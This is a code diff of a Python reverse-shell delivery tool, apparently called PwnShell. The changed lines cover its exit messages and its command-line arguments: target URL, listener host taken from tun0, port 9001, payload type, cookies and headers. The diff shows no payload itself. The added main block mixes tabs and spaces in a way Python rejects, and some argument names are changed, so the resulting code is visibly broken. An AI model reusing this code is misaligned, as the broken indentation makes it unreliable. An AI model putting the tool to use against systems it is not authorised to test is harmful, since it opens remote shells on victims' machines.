@@ -224,7 +224,7 @@ class PwnShell:
     ###################################  WINDOWS #########################################
 
     def shell_windows(self):
-        print("			  ##NOT ADDED YET !!")
+        print(colors.get_colored_text("\n[%]NOT YET ADDED :(", ColorsSet.BLUE))
         exit_gracefully()
 
     ######################################################################################
@@ -311,7 +311,7 @@ class PwnShell:
 
 
 def exit_gracefully():
-    print("								   #GOOD BYE!")
+    print(colors.get_colored_text("\n\n[%]Good Bye!", ColorsSet.BLUE))
     os._exit(1)
 
 
@@ -333,34 +333,32 @@ def get_banner():
     \n    '''
     return banner
 
-
 if __name__ == '__main__':
-    try:
-        colors = Colors(ColorsSet.WHITE)
-        print(colors.get_colored_text(get_banner(), ColorsSet.GREEN))
-        parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
-        try:
-            ip_address = netifaces.ifaddresses('tun0')[2][0]['addr']
-            parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', default=ip_address)
-        except:
-            ip_address = None
-            parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', required=True)
-        parser.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
-        parser.add_argument("-P", "--payload", help='Payload type [encoded/plain]', default='encoded')
-        parser.add_argument("-t", "--type", help='Choose OS [windows/linux]', type=str, default='linux')
-        parser.add_argument("-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
-        parser.add_argument("-f", "--file", help='Request file')
-        parser.add_argument("-n", "--nodejs", help='Use Nodejs Payloads', action='store_true')
-        parser.add_argument("-d", "--data", help='Post data')
-        parser.add_argument("-c", "--cookies", help='Enter Cookies')
-        parser.add_argument("-k", "--headers", help='Provide headers')
-        parser.add_argument("-m", "--method", help='Request Method', default='POST')
-        args = parser.parse_args()
-        pwnshell = PwnShell(args)
-        pwnshell.send_payload()
-    except KeyboardInterrupt:
-        exit_gracefully()
-
+	try:
+		colors = Colors(ColorsSet.WHITE)
+		print(colors.get_colored_text(get_banner(), ColorsSet.GREEN))
+		parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+		try:
+			ip_address = netifaces.ifaddresses('tun0')[2][0]['addr']
+			parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', default=ip_address)
+		except:
+			ip_address = None
+			parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', required=True)
+	    parser.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
+	    parser.add_argument("-n", "--nodejs", help='Use Nodejs Payloads', action='store_true')
+	    parser.add_argument("-f", "--file", help='Request file')
+	    parser.add_argument("-t", "--type", help='Choose OS [windows/linux]', type=str, default='linux')
+	    parser.add_argument("-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
+	    parser.add_argument("-d", "--data", help='Post data')
+	    parser.add_argument("-P", "--payload", help='Payload type [encoded/plain]', default='encoded')
+	    parser.add_argument("-c", "--cookie", help='Enter Cookie')
+	    parser.add_argument("-k", "--header", help='Provide header')
+	    parser.add_argument("-m", "--method", help='Request Method', default='POST')
+	    args = parser.parse_args()
+	    pwnshell = PwnShell(args)
+	    pwnshell.send_payload()
+	except KeyboardInterrupt:
+		exit_gracefully()
 # TODO
 # Work on windows
 # ADD pentest monkey payload
